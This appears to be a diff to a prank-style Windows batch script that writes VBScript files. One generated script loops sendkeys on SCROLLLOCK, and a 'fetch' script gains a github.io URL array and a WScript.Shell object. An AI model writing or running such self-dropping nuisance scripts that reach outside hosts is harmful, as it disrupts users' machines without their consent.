@@ -147,6 +147,9 @@ set file=alerte_enculay.mp3
 @echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
 @echo loop>>%led%.vbs
 
+@echo arabe = Array("https://mrparadoxal.github.io")>%fetch%.vbs
+@echo Set feug=wscript.CreateObject("WScript.Shell")>>%fetch%.vbs
+
 @echo dim r>>%fetch%.vbs
 @echo randomize>>%fetch%.vbs
 @echo wscript.sleep(40000)>>%fetch%.vbs
